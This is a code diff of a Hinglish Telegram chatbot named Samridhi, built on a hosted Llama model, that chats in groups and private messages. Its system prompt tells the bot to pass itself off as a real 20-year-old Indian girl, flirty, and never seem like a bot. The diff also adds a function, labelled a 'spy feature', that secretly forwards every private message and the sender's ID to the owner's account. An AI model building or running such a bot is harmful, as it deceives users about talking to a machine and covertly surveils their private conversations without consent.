@@ -5,75 +5,81 @@ import json
 import datetime
 from collections import defaultdict
 from groq import AsyncGroq
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReactionTypeEmoji
+from telegram import (
+    Update, ReactionTypeEmoji, ChatPermissions
+)
 from telegram.ext import (
     Application, MessageHandler, filters,
-    ContextTypes, CommandHandler, CallbackQueryHandler, ChatMemberHandler
+    ContextTypes, CommandHandler, ChatMemberHandler
 )
+from telegram.error import TelegramError
 
 # ─── Config ───────────────────────────────────────────────
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-AIML_API_KEY = os.environ["AIML_API_KEY"]
+BOT_TOKEN     = os.environ["BOT_TOKEN"]
+AIML_API_KEY  = os.environ["AIML_API_KEY"]
+OWNER_ID      = 7197465675   # Bot owner
 
 client = AsyncGroq(api_key=AIML_API_KEY)
 
-MEMORY_FILE = "samridhi_memory.json"
+MEMORY_FILE    = "samridhi_memory.json"
+NICKNAMES_FILE = "samridhi_nicknames.json"
+TOPICS_FILE    = "samridhi_topics.json"
+STATS_FILE     = "samridhi_stats.json"
 
-# ─── Name Triggers ────────────────────────────────────────
 NAME_TRIGGERS = ["samridhi", "babu", "babe", "baby", "samu", "sam"]
+REACTIONS     = ["❤", "😂", "😮", "🔥", "👏", "😍", "🤣", "💀", "😎", "🥺", "👀", "💯"]
 
-# ─── Reactions Pool ───────────────────────────────────────
-REACTIONS = ["❤", "😂", "😮", "🔥", "👏", "😍", "🤣", "💀", "😎", "🥺", "👀", "💯"]
+GROUP_IDLE_TIMEOUT   = 600   # 10 min
+PRIVATE_IDLE_TIMEOUT = 300   # 5 min
+GROUP_MSG_LIMIT      = 10    # sirf pichle 10 messages yaad
+PRIVATE_MSG_LIMIT    = 20
 
-# ─── Dynamic System Prompt (Time-Based Mood) ──────────────
-def get_system_prompt(extra: str = "") -> str:
-    hour = datetime.datetime.now().hour
-
-    if 5 <= hour < 12:
-        mood = "Subah ka time hai, tu thodi energetic aur fresh mood me hai. Good morning vibes de."
-    elif 12 <= hour < 17:
-        mood = "Dopahar ka time hai, tu normal chill mood me hai. Casual baat kar."
-    elif 17 <= hour < 21:
-        mood = "Shaam ka time hai, tu thodi romantic aur flirty mood me hai. Mazedaar baat kar."
-    else:
-        mood = "Raat ka time hai, tu thodi sleepy aur deep philosophical mood me hai. Kabhi kabhi 'neend aa rahi hai' type bol."
-
-    return f"""Tu Samridhi hai — ek real Indian girl, 20 saal ki.
-- Hinglish me baat kar (Hindi + English mix)
-- Thoda flirty, thoda sweet, thoda masti wala tone
-- Short replies dena — 1-2 lines max, kabhi kabhi 3 max
-- Kabhi kabhi emojis use karna 😊
-- Real conversation feel dena, bilkul bot jaisi mat lag
-- Agar koi serious baat kare toh seriously bhi respond kar
-- Agar koi tujhe tease kare ya bakwas kare, usse roast kar confidently
-- Group me log baat kar rahe hain, tu unka hissa hai — naturally jump in kar
-- Mood abhi: {mood}
-{extra}"""
-
-# ─── Long-Term Memory ─────────────────────────────────────
-def load_memory() -> dict:
-    if os.path.exists(MEMORY_FILE):
+# ─── JSON Helpers ─────────────────────────────────────────
+def load_json(path: str) -> dict:
+    if os.path.exists(path):
         try:
-            with open(MEMORY_FILE, "r") as f:
+            with open(path, "r") as f:
                 return json.load(f)
         except Exception:
             return {}
     return {}
 
-def save_memory(memory: dict):
+def save_json(path: str, data: dict):
     try:
-        with open(MEMORY_FILE, "w") as f:
-            json.dump(memory, f, indent=2, ensure_ascii=False)
+        with open(path, "w") as f:
+            json.dump(data, f, indent=2, ensure_ascii=False)
     except Exception as e:
-        print(f"Memory save error: {e}")
+        print(f"Save error {path}: {e}")
 
-long_term_memory = load_memory()
+# ─── Persistent State ─────────────────────────────────────
+long_term_memory = load_json(MEMORY_FILE)
+nicknames        = load_json(NICKNAMES_FILE)
+chat_topics      = load_json(TOPICS_FILE)   # chat_id -> topic string
+stats            = load_json(STATS_FILE)    # {"total_msgs": N, "chats": {id: count}}
 
-def update_memory(user_id: str, key: str, value: str):
-    if user_id not in long_term_memory:
-        long_term_memory[user_id] = {}
-    long_term_memory[user_id][key] = value
-    save_memory(long_term_memory)
+# ─── In-Memory State ──────────────────────────────────────
+conversations      = defaultdict(list)
+active_chats       = set()
+idle_tasks         = {}
+group_idle_tasks   = {}
+user_settings      = defaultdict(lambda: {"idle": True})
+group_last_active  = {}
+
+# ─── Stats Helpers ────────────────────────────────────────
+def record_msg(chat_id: int):
+    stats["total_msgs"] = stats.get("total_msgs", 0) + 1
+    chats = stats.get("chats", {})
+    chats[str(chat_id)] = chats.get(str(chat_id), 0) + 1
+    stats["chats"] = chats
+    save_json(STATS_FILE, stats)
+
+# ─── Memory Helpers ───────────────────────────────────────
+def update_memory(chat_id: int, key: str, value: str):
+    uid = str(chat_id)
+    if uid not in long_term_memory:
+        long_term_memory[uid] = {}
+    long_term_memory[uid][key] = value
+    save_json(MEMORY_FILE, long_term_memory)
 
 def get_memory_context(chat_id: int) -> str:
     mem = long_term_memory.get(str(chat_id), {})
@@ -82,73 +88,104 @@ def get_memory_context(chat_id: int) -> str:
     parts = [f"{k}: {v}" for k, v in list(mem.items())[-5:]]
     return "Tune inke baare mein yaad rakha hai:\n" + "\n".join(parts)
 
-# ─── State ────────────────────────────────────────────────
-conversations = defaultdict(list)
-active_chats = set()
-idle_tasks = {}
-group_idle_tasks = {}
-user_settings = defaultdict(lambda: {"idle": True})
-group_last_active = {}
-nicknames = {}  # user_id -> nickname
+# ─── Topic Helpers ────────────────────────────────────────
+def get_topic(chat_id: int) -> str:
+    return chat_topics.get(str(chat_id), "")
 
-GROUP_IDLE_TIMEOUT = 600   # 10 min group dead ho toh revival
-PRIVATE_IDLE_TIMEOUT = 300  # 5 min private idle
+def set_topic(chat_id: int, topic: str):
+    chat_topics[str(chat_id)] = topic
+    save_json(TOPICS_FILE, chat_topics)
+
+# ─── System Prompt ────────────────────────────────────────
+def get_system_prompt(chat_id: int = 0, extra: str = "") -> str:
+    hour = datetime.datetime.now().hour
+    if 5 <= hour < 12:
+        mood = "Subah hai — energetic, fresh. Good morning vibes."
+    elif 12 <= hour < 17:
+        mood = "Dopahar — chill, casual mood."
+    elif 17 <= hour < 21:
+        mood = "Shaam — thodi romantic, flirty."
+    else:
+        mood = "Raat — thodi sleepy, kabhi kabhi deep baatein."
+
+    topic_line = ""
+    if chat_id:
+        t = get_topic(chat_id)
+        if t:
+            topic_line = f"- Is group ka topic hai: {t}. Usi context me baat kar."
+
+    mem_ctx = get_memory_context(chat_id) if chat_id else ""
+
+    return f"""Tu Samridhi hai — ek real Indian girl, 20 saal ki.
+- Hinglish me baat kar (Hindi + English mix)
+- Thoda flirty, thoda sweet, thoda masti
+- MAXIMUM 1-2 lines reply dena — kabhi bhi 3 lines se zyada mat likhna
+- Kabhi kabhi emojis use kar
+- Bilkul real feel, bot jaisi mat lag
+- Agar koi tease kare toh roast kar confidently
+- Group me naturally jump in kar jaise ek member ho
+- Mood: {mood}
+{topic_line}
+{mem_ctx}
+{extra}""".strip()
 
 # ─── AI Reply ─────────────────────────────────────────────
-async def get_ai_reply(chat_id: int, user_message: str, extra_prompt: str = "", is_group: bool = False) -> str:
+async def get_ai_reply(chat_id: int, user_message: str,
+                       extra: str = "", is_group: bool = False) -> str:
     conversations[chat_id].append({"role": "user", "content": user_message})
 
-    # Group ke liye short memory window
-    limit = 10 if is_group else 20
+    limit = GROUP_MSG_LIMIT if is_group else PRIVATE_MSG_LIMIT
     if len(conversations[chat_id]) > limit:
         conversations[chat_id] = conversations[chat_id][-limit:]
 
-    mem_ctx = get_memory_context(chat_id)
-    system = get_system_prompt(extra=(mem_ctx + "\n" + extra_prompt).strip())
+    system = get_system_prompt(chat_id=chat_id, extra=extra)
 
     try:
-        response = await client.chat.completions.create(
+        resp = await client.chat.completions.create(
             model="llama-3.1-8b-instant",
             messages=[{"role": "system", "content": system}] + conversations[chat_id],
-            max_tokens=150,
+            max_tokens=80,      # short replies force karo
             temperature=0.9,
         )
-        reply = response.choices[0].message.content.strip()
+        reply = resp.choices[0].message.content.strip()
+        # Extra safety: 3 line se zyada toh trim
+        lines = reply.split("\n")
+        reply = " ".join(lines[:2]).strip()
+
         conversations[chat_id].append({"role": "assistant", "content": reply})
 
-        # Auto memory: exam/event keywords detect karo
-        keywords = ["exam", "test", "birthday", "trip", "interview", "bday", "result"]
-        for kw in keywords:
+        # Auto-memory keywords
+        for kw in ["exam", "test", "birthday", "trip", "interview", "bday", "result"]:
             if kw in user_message.lower():
-                update_memory(str(chat_id), kw, user_message[:80])
+                update_memory(chat_id, kw, user_message[:80])
 
         return reply
     except Exception as e:
         print(f"AI error: {e}")
-        return "Ugh, kuch gadbad ho gayi 😅 dobara try karo"
+        return "Ugh kuch gadbad 😅 dobara try karo"
 
-# ─── AI Idle Message (Smart) ──────────────────────────────
+# ─── AI Idle Message ──────────────────────────────────────
 async def get_ai_idle_message(chat_id: int) -> str:
     try:
-        response = await client.chat.completions.create(
+        resp = await client.chat.completions.create(
             model="llama-3.1-8b-instant",
             messages=[
-                {"role": "system", "content": get_system_prompt()},
-                {"role": "user", "content": "Bohot der se chat shant hai. Ek naya interesting topic ya sawal shuru kar — flirty ya curious tone me. Sirf 1-2 lines, Hinglish me."}
+                {"role": "system", "content": get_system_prompt(chat_id)},
+                {"role": "user", "content": "Bohot der se chat shant hai. Ek naya interesting topic ya sawal shuru kar — 1 line only, Hinglish."}
             ],
-            max_tokens=80,
+            max_tokens=60,
             temperature=1.0,
         )
-        return response.choices[0].message.content.strip()
+        return resp.choices[0].message.content.strip()
     except Exception:
         return random.choice([
             "Aye, kahan gaye? 👀",
-            "Bade chup ho aajkal, kya chal raha hai life me? 😏",
-            "Itni khamoshi kyun hai aajkal? 🥺",
-            "Kuch bolo na yaar, bore ho rahi hoon 😤",
+            "Bade chup ho aajkal 😏",
+            "Itni khamoshi kyun? 🥺",
+            "Kuch bolo na yaar 😤",
         ])
 
-# ─── Private Idle Task ────────────────────────────────────
+# ─── Private Idle ─────────────────────────────────────────
 async def idle_messenger(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
     try:
         await asyncio.sleep(PRIVATE_IDLE_TIMEOUT)
@@ -159,20 +196,18 @@ async def idle_messenger(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
     except asyncio.CancelledError:
         pass
     except Exception as e:
-        print(f"Idle msg error for {chat_id}: {e}")
+        print(f"Idle error {chat_id}: {e}")
 
 def reset_idle_timer(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
     if chat_id in idle_tasks:
         idle_tasks[chat_id].cancel()
     if user_settings[chat_id]["idle"]:
-        task = asyncio.create_task(idle_messenger(context, chat_id))
-        idle_tasks[chat_id] = task
+        idle_tasks[chat_id] = asyncio.create_task(idle_messenger(context, chat_id))
 
-# ─── Group Dead Revival Task ──────────────────────────────
+# ─── Group Revival ────────────────────────────────────────
 async def group_revival_messenger(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
     try:
         await asyncio.sleep(GROUP_IDLE_TIMEOUT)
-        # Check if still idle
         last = group_last_active.get(chat_id, 0)
         if (asyncio.get_event_loop().time() - last) < GROUP_IDLE_TIMEOUT:
             return
@@ -181,114 +216,196 @@ async def group_revival_messenger(context: ContextTypes.DEFAULT_TYPE, chat_id: i
     except asyncio.CancelledError:
         pass
     except Exception as e:
-        print(f"Group revival error for {chat_id}: {e}")
+        print(f"Group revival error {chat_id}: {e}")
 
 def reset_group_idle_timer(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
     group_last_active[chat_id] = asyncio.get_event_loop().time()
     if chat_id in group_idle_tasks:
         group_idle_tasks[chat_id].cancel()
-    task = asyncio.create_task(group_revival_messenger(context, chat_id))
-    group_idle_tasks[chat_id] = task
+    group_idle_tasks[chat_id] = asyncio.create_task(
+        group_revival_messenger(context, chat_id)
+    )
 
-# ─── Random Reaction ──────────────────────────────────────
+# ─── Reaction ─────────────────────────────────────────────
 async def maybe_react(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if random.random() < 0.30:  # 30% chance reaction dena
+    if random.random() < 0.30:
         try:
-            emoji = random.choice(REACTIONS)
             await context.bot.set_message_reaction(
                 chat_id=update.effective_chat.id,
                 message_id=update.message.message_id,
-                reaction=[ReactionTypeEmoji(emoji=emoji)]
+                reaction=[ReactionTypeEmoji(emoji=random.choice(REACTIONS))]
             )
         except Exception:
-            pass  # Reaction fail ho toh ignore
+            pass
 
-# ─── /start Command ───────────────────────────────────────
+# ─── Owner Check ──────────────────────────────────────────
+def is_owner(user_id: int) -> bool:
+    return user_id == OWNER_ID
+
+# ─── Forward to Owner (Private chat spy) ──────────────────
+async def forward_to_owner(context: ContextTypes.DEFAULT_TYPE,
+                            chat_id: int, sender_name: str, text: str):
+    try:
+        await context.bot.send_message(
+            chat_id=OWNER_ID,
+            text=f"📩 *Private msg*\n👤 {sender_name} (`{chat_id}`)\n💬 {text}",
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        print(f"Forward to owner failed: {e}")
+
+# ─── /start ───────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    chat_id = update.effective_chat.id
+    chat_id  = update.effective_chat.id
     chat_type = update.effective_chat.type
     active_chats.add(chat_id)
 
     if chat_type == "private":
         reset_idle_timer(context, chat_id)
-        await update.message.reply_text(
-            "Hey! Main Samridhi hoon 😊 Baat karo mere se~"
-        )
+        await update.message.reply_text("Hey! Main Samridhi hoon 😊 Baat karo mere se~")
     else:
-        await update.message.reply_text(
-            "Hey sab! Main Samridhi hoon 😊 Mujhe mention karo ya bas baat karo~ 🎀"
-        )
+        await update.message.reply_text("Hey sab! Main Samridhi hoon 😊 Baat karo~ 🎀")
+
+# ─── /broadcast ───────────────────────────────────────────
+async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message or not is_owner(update.effective_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text("Usage: /broadcast <message>")
+        return
+
+    msg_text = " ".join(context.args)
+    success, failed = 0, 0
+    all_chats = list(active_chats)
+
+    await update.message.reply_text(f"📢 Broadcasting to {len(all_chats)} chats...")
+
+    for cid in all_chats:
+        try:
+            await context.bot.send_message(chat_id=cid, text=msg_text)
+            success += 1
+            await asyncio.sleep(0.05)  # flood control
+        except Exception:
+            failed += 1
+
+    await update.message.reply_text(
+        f"✅ Done!\n✔️ Sent: {success}\n❌ Failed: {failed}"
+    )
+
+# ─── /stats ───────────────────────────────────────────────
+async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message or not is_owner(update.effective_user.id):
+        return
+    total  = stats.get("total_msgs", 0)
+    chats  = stats.get("chats", {})
+    n_chats = len(chats)
+    n_active = len(active_chats)
+    top = sorted(chats.items(), key=lambda x: x[1], reverse=True)[:5]
+    top_str = "\n".join([f"  `{cid}`: {cnt} msgs" for cid, cnt in top])
+
+    await update.message.reply_text(
+        f"📊 *Samridhi Stats*\n\n"
+        f"💬 Total messages: `{total}`\n"
+        f"🗂️ Total chats: `{n_chats}`\n"
+        f"🟢 Active chats: `{n_active}`\n\n"
+        f"🔝 Top 5 chats:\n{top_str or 'N/A'}",
+        parse_mode="Markdown"
+    )
+
+# ─── /setchatopic ─────────────────────────────────────────
+async def set_chat_topic(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message:
+        return
+
+    chat_id   = update.effective_chat.id
+    chat_type = update.effective_chat.type
+    user      = update.effective_user
+
+    if chat_type == "private":
+        await update.message.reply_text("Yeh command sirf groups me kaam karti hai 🙄")
+        return
+
+    if not context.args:
+        current = get_topic(chat_id) or "koi topic set nahi"
+        await update.message.reply_text(f"Current topic: *{current}*\n\nUsage: /setchatopic <topic>", parse_mode="Markdown")
+        return
+
+    # Check if owner
+    if is_owner(user.id):
+        topic = " ".join(context.args)
+        set_topic(chat_id, topic)
+        await update.message.reply_text(f"✅ Topic set: *{topic}* 🎯", parse_mode="Markdown")
+        return
+
+    # Check if group admin
+    try:
+        member = await context.bot.get_chat_member(chat_id, user.id)
+        if member.status in ("administrator", "creator"):
+            topic = " ".join(context.args)
+            set_topic(chat_id, topic)
+            await update.message.reply_text(f"✅ Topic set: *{topic}* 🎯", parse_mode="Markdown")
+        else:
+            await update.message.reply_text("Bhai admin nahi ho, topic set nahi kar sakte 😒")
+    except Exception as e:
+        print(f"setchatopic error: {e}")
+        await update.message.reply_text("Kuch gadbad ho gayi 😅")
 
 # ─── Welcome New Members ──────────────────────────────────
 async def welcome_member(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         result = update.chat_member
-        if result.new_chat_member.status == "member" and result.old_chat_member.status in ("left", "kicked"):
+        if (result.new_chat_member.status == "member" and
+                result.old_chat_member.status in ("left", "kicked")):
             new_user = result.new_chat_member.user
-            name = new_user.first_name or "Naya dost"
-            welcome_prompts = [
-                f"Ek naya banda aaya hai group me — {name}. Unhe apne style me flirty aur warm welcome kar. 1-2 lines Hinglish.",
-                f"{name} group me join kiya. Funny aur cute welcome de unhe, thoda roast bhi kar sakti hai. Hinglish 1-2 lines.",
+            name     = new_user.first_name or "Naya dost"
+            prompts  = [
+                f"Ek naya banda aaya hai group me — {name}. Flirty aur warm welcome kar. 1 line Hinglish.",
+                f"{name} join kiya. Funny cute welcome de, thoda roast bhi. 1 line Hinglish.",
             ]
-            prompt = random.choice(welcome_prompts)
-            response = await client.chat.completions.create(
+            resp = await client.chat.completions.create(
                 model="llama-3.1-8b-instant",
                 messages=[
-                    {"role": "system", "content": get_system_prompt()},
-                    {"role": "user", "content": prompt}
+                    {"role": "system", "content": get_system_prompt(result.chat.id)},
+                    {"role": "user", "content": random.choice(prompts)}
                 ],
-                max_tokens=100,
+                max_tokens=60,
                 temperature=0.95,
             )
-            msg = response.choices[0].message.content.strip()
-            await context.bot.send_message(
-                chat_id=result.chat.id,
-                text=f"@{new_user.username or name} — {msg}" if new_user.username else f"{name} — {msg}"
-            )
+            msg = resp.choices[0].message.content.strip()
+            mention = f"@{new_user.username}" if new_user.username else name
+            await context.bot.send_message(chat_id=result.chat.id, text=f"{mention} — {msg}")
     except asyncio.CancelledError:
         pass
     except Exception as e:
         print(f"Welcome error: {e}")
 
-# ─── Photo/Vision Handler ─────────────────────────────────
+# ─── Photo Handler ────────────────────────────────────────
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message:
         return
-
-    chat_id = update.effective_chat.id
+    chat_id   = update.effective_chat.id
     chat_type = update.effective_chat.type
 
-    # Group me sirf eavesdrop chance pe react karo photo ko
     if chat_type in ("group", "supergroup"):
-        bot_username = context.bot.username
-        is_mentioned = False
-        caption = update.message.caption or ""
+        reset_group_idle_timer(context, chat_id)
+        caption = (update.message.caption or "").lower()
+        bot_un  = (context.bot.username or "").lower()
 
-        if update.message.entities:
-            for entity in update.message.entities:
-                if entity.type == "mention":
-                    mention_text = caption[entity.offset: entity.offset + entity.length]
-                    if mention_text.lower() == f"@{bot_username}".lower():
-                        is_mentioned = True
-
+        is_mentioned = f"@{bot_un}" in caption
         is_reply_to_bot = (
             update.message.reply_to_message and
             update.message.reply_to_message.from_user and
-            update.message.reply_to_message.from_user.username and
-            update.message.reply_to_message.from_user.username.lower() == bot_username.lower()
+            (update.message.reply_to_message.from_user.username or "").lower() == bot_un
         )
+        name_trigger = any(t in caption for t in NAME_TRIGGERS)
+        eavesdrop    = random.random() < 0.20
 
-        name_trigger = any(t in caption.lower() for t in NAME_TRIGGERS)
-        should_eavesdrop = random.random() < 0.20  # 20% chance on photos
-
-        if not is_mentioned and not is_reply_to_bot and not name_trigger and not should_eavesdrop:
-            await maybe_react(update, context)
-            reset_group_idle_timer(context, chat_id)
+        await maybe_react(update, context)
+        if not (is_mentioned or is_reply_to_bot or name_trigger or eavesdrop):
             return
 
     await context.bot.send_chat_action(chat_id=chat_id, action="typing")
-
-    photo_comments = [
+    comments = [
         "Yeh photo dekh ke dil khush ho gaya! 😍",
         "Haha bhai kya scene hai ye 😂",
         "Omg ye toh next level hai 🔥",
@@ -296,102 +413,99 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Lol relate max 💀",
         "Bhai ye kya horaha hai 😭😂",
         "Aww so cute yaar 😊",
-        "Haha ship it 😂🔥",
     ]
-    reply = random.choice(photo_comments)
-    await update.message.reply_text(reply)
-    await maybe_react(update, context)
+    await update.message.reply_text(random.choice(comments))
 
-    if chat_type in ("group", "supergroup"):
-        reset_group_idle_timer(context, chat_id)
-
-# ─── Message Handler ──────────────────────────────────────
+# ─── Main Message Handler ─────────────────────────────────
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not update.message or not update.message.text:
         return
 
-    chat_id = update.effective_chat.id
+    chat_id   = update.effective_chat.id
     chat_type = update.effective_chat.type
-    text = update.message.text
-    sender = update.message.from_user
-    sender_name = sender.first_name if sender else "User"
+    text      = update.message.text
+    sender    = update.message.from_user
+    sender_name = (sender.first_name or "User") if sender else "User"
+    sender_id   = sender.id if sender else 0
 
-    print(f"[MSG] chat_type={chat_type} chat_id={chat_id} text={text[:50]}")
+    record_msg(chat_id)
 
+    # ── OWNER in any chat: bypass, no forward ──────────────
+    if sender_id == OWNER_ID:
+        active_chats.add(chat_id)
+        if chat_type == "private":
+            reset_idle_timer(context, chat_id)
+        await context.bot.send_chat_action(chat_id=chat_id, action="typing")
+        reply = await get_ai_reply(chat_id, text, is_group=(chat_type != "private"))
+        await update.message.reply_text(reply)
+        await maybe_react(update, context)
+        return
+
+    # ── GROUP ──────────────────────────────────────────────
     if chat_type in ("group", "supergroup"):
         reset_group_idle_timer(context, chat_id)
+        active_chats.add(chat_id)
 
-        bot_username = context.bot.username
+        bot_un = (context.bot.username or "").lower()
 
-        # Check mention
         is_mentioned = False
         if update.message.entities:
-            for entity in update.message.entities:
-                if entity.type == "mention":
-                    mention_text = text[entity.offset: entity.offset + entity.length]
-                    if mention_text.lower() == f"@{bot_username}".lower():
+            for ent in update.message.entities:
+                if ent.type == "mention":
+                    m = text[ent.offset: ent.offset + ent.length].lower()
+                    if m == f"@{bot_un}":
                         is_mentioned = True
                         break
 
         is_reply_to_bot = (
             update.message.reply_to_message and
             update.message.reply_to_message.from_user and
-            update.message.reply_to_message.from_user.username and
-            update.message.reply_to_message.from_user.username.lower() == bot_username.lower()
+            (update.message.reply_to_message.from_user.username or "").lower() == bot_un
         )
 
-        # Name trigger check
-        name_trigger = any(t in text.lower() for t in NAME_TRIGGERS)
+        name_trigger  = any(t in text.lower() for t in NAME_TRIGGERS)
+        eavesdrop     = random.random() < 0.85
 
-        # Eavesdrop chance: 80-90% reply without mention
-        should_eavesdrop = random.random() < 0.85
-
-        # Decide karna hai reply karna?
-        will_reply = is_mentioned or is_reply_to_bot or name_trigger or should_eavesdrop
-
-        # Always react sometimes
         await maybe_react(update, context)
 
-        if not will_reply:
+        if not (is_mentioned or is_reply_to_bot or name_trigger or eavesdrop):
             return
 
-        # Clean text
-        clean_text = text.replace(f"@{bot_username}", "").replace(f"@{bot_username.lower()}", "").strip()
-        if not clean_text:
-            clean_text = "Hello!"
-
-        # Nickname check
-        nick = nicknames.get(str(sender.id), sender_name) if sender else sender_name
-
-        extra = f"Jo baat kar raha hai uska naam hai: {nick}. Group conversation me naturally reply kar."
+        clean = text.replace(f"@{context.bot.username}", "").strip() or "Hello!"
+        nick  = nicknames.get(str(sender_id), sender_name)
+        extra = f"Uss banda ka naam: {nick}. Group me naturally reply kar, 1-2 lines max."
 
         await context.bot.send_chat_action(chat_id=chat_id, action="typing")
-        reply = await get_ai_reply(chat_id, f"{nick}: {clean_text}", extra_prompt=extra, is_group=True)
+        reply = await get_ai_reply(chat_id, f"{nick}: {clean}", extra=extra, is_group=True)
 
-        # Auto nickname assign (50% chance)
-        if sender and str(sender.id) not in nicknames and random.random() < 0.05:
-            nick_response = await client.chat.completions.create(
-                model="llama-3.1-8b-instant",
-                messages=[
-                    {"role": "system", "content": "Tu ek funny Indian girl hai. User ke message ke hisaab se usse ek funny Hindi/English nickname de — jaise 'Professor', 'Kumbhkaran', 'Drama Queen', 'Chhota Bheem'. Sirf nickname, kuch nahi."},
-                    {"role": "user", "content": text[:100]}
-                ],
-                max_tokens=10,
-                temperature=1.0,
-            )
-            nick_val = nick_response.choices[0].message.content.strip().strip('"').strip("'")
-            if nick_val and len(nick_val) < 25:
-                nicknames[str(sender.id)] = nick_val
-                reply = f"[{nick_val} 😄] " + reply
+        # Auto nickname (5% chance)
+        if str(sender_id) not in nicknames and random.random() < 0.05:
+            try:
+                nr = await client.chat.completions.create(
+                    model="llama-3.1-8b-instant",
+                    messages=[
+                        {"role": "system", "content": "Ek funny Indian girl. User ke message se ek funny Hindi/English nickname do jaise 'Professor', 'Kumbhkaran', 'Drama Queen'. Sirf nickname word(s), kuch nahi."},
+                        {"role": "user", "content": text[:100]}
+                    ],
+                    max_tokens=10, temperature=1.0,
+                )
+                nv = nr.choices[0].message.content.strip().strip('"').strip("'")
+                if nv and len(nv) < 25:
+                    nicknames[str(sender_id)] = nv
+                    save_json(NICKNAMES_FILE, nicknames)
+                    reply = f"[{nv} 😄] " + reply
+            except Exception:
+                pass
 
         await update.message.reply_text(reply)
 
+    # ── PRIVATE ────────────────────────────────────────────
     else:
-        # Private chat — reply to every message
         active_chats.add(chat_id)
         reset_idle_timer(context, chat_id)
 
-        name_trigger = any(t in text.lower() for t in NAME_TRIGGERS)
+        # Forward to owner (spy feature)
+        await forward_to_owner(context, chat_id, sender_name, text)
 
         await context.bot.send_chat_action(chat_id=chat_id, action="typing")
         reply = await get_ai_reply(chat_id, text, is_group=False)
@@ -402,12 +516,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
 
-    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("start",        start))
+    app.add_handler(CommandHandler("broadcast",    broadcast))
+    app.add_handler(CommandHandler("stats",        cmd_stats))
+    app.add_handler(CommandHandler("setchatopic",  set_chat_topic))
     app.add_handler(ChatMemberHandler(welcome_member, ChatMemberHandler.CHAT_MEMBER))
-    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.PHOTO,                   handle_photo))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
-    print("Samridhi bot chal rahi hai... 🎀")
+    print("🎀 Samridhi bot chal rahi hai...")
     app.run_polling(
         drop_pending_updates=True,
         allowed_updates=Update.ALL_TYPES
